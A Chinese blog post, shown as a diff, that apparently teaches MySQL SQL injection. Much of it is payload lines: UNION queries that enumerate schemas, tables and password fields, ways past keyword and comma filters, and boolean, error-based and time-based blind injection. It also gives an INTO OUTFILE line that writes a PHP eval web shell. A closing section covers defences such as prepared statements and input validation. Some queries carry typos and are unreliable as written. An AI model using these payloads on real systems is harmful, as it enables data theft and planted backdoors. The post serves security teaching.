@@ -1,0 +1,298 @@
+---
+layout: post
+title:  "网络安全－SQL注入"
+categories: 网络安全
+tags: 网络安全 SQL注入
+author: xueyp
+description: SQL注入原理及Mysql注入
+---
+
+SQL注入原理
+============
+
+　　SQL注入是指攻击者通过精心构造SQL语句达到欺骗服务器、绕过服务器的检测过滤，最终达到执行该SQL语句，并且输出攻击者想要获取的隐秘信息的过程。
+
+　　例如：
+```
+$sql="select * from users where username=".$_GET["id"];
+```
+　　上述语句id的值是可控的，如果我们构造属于我们自己的SQL语句并且让输入框执行，那么就会产生注入漏洞。
+
+1 注入方法
+
+- 单引号（’）
+
+　　如有下面的SQL语句：
+```
+    Select * from user where id=1  
+```
+　　如果我们在id值之后加一个“ '  ”,那么sql语句就会变为：
+```
+    Select * from user where id=1'  
+```
+　　此时带入输入库查询时由于数据库对id之后的“  '  ”语法格式错误，就会产生报错。最终执行失败。同时也说明此处的ID是一个可以控制的量，服务器对用户的输入不经过过滤直接带入了数据库进行查询，此处可能是一个注入点。
+
+- and方法
+　　当页面不返回任何错误信息的时候，我们就可以使用此方法进行推断，当我们在访问页面的URL参数之后加上and 1=1 显示正常，而and 1=2 显示错误的时候即说明存在注入漏洞！因为！and 1=1永远为正确，而1=2为错误，and的逻辑运算要求两者都需要正确才可以返回真值。如果提交以上的构造语句之后，显示的页面与正常的页面没有任何区别，那么说明数据库对用户输入的信息进行了过滤操作，否则说明用户构造的SQL语句带入了数据库进行查询。
+
+- OR方法
+
+　　修改正常URL后面的参数id的数值后回车，显示错误页面，当加入or 1=1时显示正常页面，说明存在注入可能，因为or 1=1 永远为真，同时也说明出现上述现象是带入了数据库查询语句中，并且执行了。
+- 加减法
+
+这里我们需要区分一下数字型和字符串型：
+
+　　　　数字型：不需要使用单引号来表示
+
+　　　　其他类型：使用单引号来表示
+
+　　加法，我们在参数输入1+1，看看返回的数据是不是id等于2的结果，这里注意一下+号在SQL语句是有特效含义的，所以我们要对其进行url编码，也就是%2b。减法，是同样的道理，不过不需要对－号进行url编码。
+
+2 mysql注入流程
+
+- 判断是否存在SQL注入
+```
+     and 1=1  
+     and 1=2 
+```
+
+- 爆字段
+```
+    order by 猜测的字段数  
+```
+- 匹配字段
+```
+    and 1=1 union select 1,2,3,......,n  
+```
+- 获取显示字段
+```
+    and 1=2 union select 1,2,3,4......n  
+```
+- 利用内置函数爆数据库信息
+```
+    version() database() user()  
+```
+   例如：
+```
+    and 1=2 union all select version()  
+    and 1=2 union all select database()  
+    and 1=2 union all select   user()  
+```
+- 操作系统信息
+```
+    and  1=2 union  all select  @@global.version_compile_os from  mysql.user  
+```
+- 数据库权限
+```
+    and ord(mid(user(),1,1))=114              返回正常则说明为root  
+```
+- 爆库（mysql>5.0）
+
+Mysql 5.0以上版本内置库information_schema，存储着mysql的所有数据库和表结构信息。
+```
+    and 1=2 union selec 1,2,3,SCHEMA_NAME,5,6,7,8,9,10  from  information_schema.SCHEMA limit 0,1  
+```
+- 猜表
+```
+    and  1=2 union select 1,2,3,TABLE_NAME,5,6,7,8,9,10 from information_schema.TABLES where TABLE_SCHEMA=数据库（十六进制） limit 0（开始的记录，0为第一个开始记录），1（显示1条记录）  
+```
+- 爆字段
+```
+    and 1=2 union select 1,2,3,COLUMN_NAME,5,6,7,8,9,10 from information_schemation.COLUMNS where TABLE_NAMEE=表名（十六进制） limit 0 ,1  
+```
+- 爆密码
+```
+    and 1=2 union select 1,2,3,用户名段，5,6,7,8,9 from 表名 limit 0,1  
+```
+- 一个字段显示两个数据内容）：
+```
+Union select  1,2,3,concat(用户名段，0x3c，密码段)，5,6,7,8,9 form  表名 limit 0,1
+- 直接写马（Root权限）
+```
+
+条件：1、知道站点物理路径,2、有足够大的权限（可以用select …. frommysql.user测试）,3、magic_quotes_gpc()=OFF
+```
+    select ‘<?php eval_r($_POST[cmd])?>'into outfile ‘物理路径'   and  1=2   union  all   select   一句话HEX值   into  outfile   '路径'  
+```
+
+过滤特殊符号的字符型注入
+============
+1 过滤了特殊符号的字符型注入
+```
+    function blacklist($id)  
+    {  
+        $id= preg_replace('/or/i',"", $id);         //strip out OR (non case sensitive)  
+        $id= preg_replace('/and/i',"", $id);                //Strip out AND (non case sensitive)  
+        $id= preg_replace('/[\/\*]/',"", $id);              //strip out /*  
+        $id= preg_replace('/[--]/',"", $id);                //Strip out --  
+        $id= preg_replace('/[#]/',"", $id);         //Strip out #  
+        $id= preg_replace('/[\s]/',"", $id);                //Strip out spaces  
+        $id= preg_replace('/[\/\\\\]/',"", $id);        //Strip out slashes  
+        return $id;  
+    }  
+```
+　　在这部分代码中过滤了“or”、“and”、“/”、“*”、“#”、“s”
+
+**绕过方法**：
+
+- 因为有过滤，所以order by \and 等命令都不能使用。
+
+- 用o/**/rder来绕过or过滤
+
+- 用a/**/nd 来绕过and过滤，或者使ID=0来强制报错
+
+- 把注释改为；%00截断
+2 过滤了逗号的字符型注入
+```
+    function blacklist($id)  
+    {  
+        if(stripos($id,',')){       //stripos函数作用：查找 "php" 在字符串中第一次出现的位置  
+          $id='1';  
+        }else{  
+          $id=$id;  
+        }  
+        return $id;  
+    }  
+```
+**绕过方法**
+- 在注入语句中使用Join函数即可绕过
+```
+    http://127.0.0.1:8080/?id=1' and 1=2 union select * from ( (select 1)a  JOIN  (select 2) b  JOIN (select 3) c )%23  
+```
+
+
+
+盲注
+============
+　　盲注是SQL注入的一种，之所以称为盲注是因为他不会根据攻击者的SQL注入语句返回攻击者想要获取的错误信息。
+
+**SQL盲注分类**
+
+**布尔盲注**：布尔很明显有True和Flase,也就是说它会根据攻击者的注入信息返回True或者False,也就没有了之前的报错信息。
+
+**时间盲注**：界面返回值只有一种True，无论输入任何值，返回情况都会按照正常来处理。加入特定的时间函数，通过查看WEB页面的返回时间差来判断注入的语句是否正确。
+
+**报错盲注**：根据返回的显示错误信息构造SQL语句来进行的注入，称为报错盲注。
+
+**盲注中用到的函数**
+```
+Length（）                  函数 返回字符串的长度  
+Substr（）                  截取字符串  
+Ascii（）                   返回字符的ascii码  
+sleep(n)                   将程序挂起一段时间 n为n秒  
+if(expr1,expr2,expr3)      判断语句,如果第一个语句正确就执行第二个语句，如果错误执行第三个语句 
+```
+
+- **基于布尔SQL盲注————构造逻辑判断**
+
+**left(a,b)**
+```
+    left(database(),1) >'s'       
+```
+  database()显示数据库名称，left(a,b)从左侧截取a的前b位  
+
+**Substr()**
+```
+    ascii(substr((select table_name information_schema.tables where tables_schema=database()limit 0,1),1,1))=101 --+   
+```
+   substr(a,b,c)从b位置开始，截取字符串a的c长度。   
+
+   Ascii()将某个字符转换为ascii值  
+
+**ord()、mid（）**         
+```
+    ORD(MID((SELECT IFNULL(CAST(username AS CHAR),0x20)FROM security.users ORDER BY id LIMIT 0,1),1,1))>98%23    
+```
+   mid(a,b,c)从位置b开始，截取a字符串的c位  
+
+   Ord()函数同ascii()，将字符转为ascii值  
+
+**regexp（）正则注入**
+```
+    select user() regexp '^[a-z]';  
+   正则表达式的用法，user()结果为root，regexp为匹配root的正则表达式。  
+```
+匹配第二位：
+```
+    select user() regexp '^ro'  
+```
+当正确的时候显示结果为1，不正确的时候显示结果为0.
+
+**Like匹配注入**
+
+和正则注入类似，mysql在匹配的时候可以使用like进行匹配
+```
+    select user() like 'ro%'  
+```
+- **基于报错的SQL盲注**构造payload让信息通过错误提示回显出来
+
+```
+floor()、extravtvalue()、updatexml()
+```
+
+- **基于时间的SQL盲注——延时注入**
+
+**if语句+sleep()函数**
+```
+    If(ascii(substr(database(),1,1))>115,0,sleep(5))%23   
+```
+ if判断语句，条件为假时，执行sleep
+
+**benchmark（）函数**
+```
+    UNION SELECT IF(SUBSTRING(current,1,1)=CHAR(119),BENCHMARK(5000000,ENCODE('MSG','by 5 seconds')),null) FROM (select database() as current) as tb1;  
+```
+ benchmark（count，expr）用于测试函数的性能，参数一为次数，参数而为要执行的表达式。可以让函数执行若干次，返回结果比平时要长，通过时间长短的变化，判断语句是否执行成功。这是一种边信道攻击，在运行过程中占用大量的CPU资源，所以平时推荐使用sleep（）函数。
+
+注入防范策略
+============
+  要防止SQL注入攻击，就必须明白数据库只负责执行SQL语句，根据SQL语句来返回相关的数据。数据库并没有过滤SQL注入的手段，哪怕是存储过程也不例外。要防止SQL注入其实还得**从代码入手**。
+
+**严格的数据类型**
+
+Java 、C++等强类型语言几乎可以完全忽略数字型注入，而对于PHP等弱类型语言来说存在数字型注入的可能性就非常大了，但是我们还是可以通过严格的判断数据类型来进行防范。
+
+**特殊字符转义**
+
+攻击者在利用SQL注入时往往会尝试构造SQL注入语句，我们可以通过过滤常用的SQL语句中的一些关键词、关键符号等来防止这类注入的利用。
+
+**使用预编译语句**
+
+像JAVA、C#这些语言都提供了预编译语句，例如Statement、PreparedStatement这些语句都可以进行预编译处理
+
+**使用框架**
+
+对于JSP、PHP等我们可以是哟相关的技术类框架来提高安全性，但是也不能全部依靠框架，自己在编码的过程中也要注意diam的安全性。
+
+**输入验证**
+
+凡是存在输入的地方皆可能存在风险，所以每当我们面对用户的输入操作是我们需要进行严格的过滤措施。
+
+面对用户的输入我们有两种不同类型的验证输入方法：白名单和黑名单！
+
+白名单：只允许在该名单内的用户（或者其他凭据信息）通过验证进行登录或者操作。
+
+黑名单：对该名单内的用户名或者IP地址进行封杀，不允许其进行任何操作。
+输出编码
+
+我们除了要验证应用程序收到的输入以外，还要对数据进行编码，这样不仅可以防御SQL注入攻击，还能防止出现其他问题，比如XSS。
+
+**使用安全函数**
+
+为了提高安全性不少的编程语言都有相应的安全函数，我们可以通过使用这些安全函数来提高系统的安全性！
+
+注入工具
+============
+
+sqlmap
+pangolin
+Havij
+
+参考
+============
+[SQL Injection](https://en.wikipedia.org/wiki/SQL_injection)
+[OWASP SQL Injection](https://www.owasp.org/index.php/SQL_Injection)
+[SQLi-labsSQL注入练习系统](https://resources.infosecinstitute.com/tutorial-on-sqli-labs/)
+
+
+版权声明：本文为博主原创文章，转载请注明出处。 [旭日酒馆](https://xueyp.github.io/)
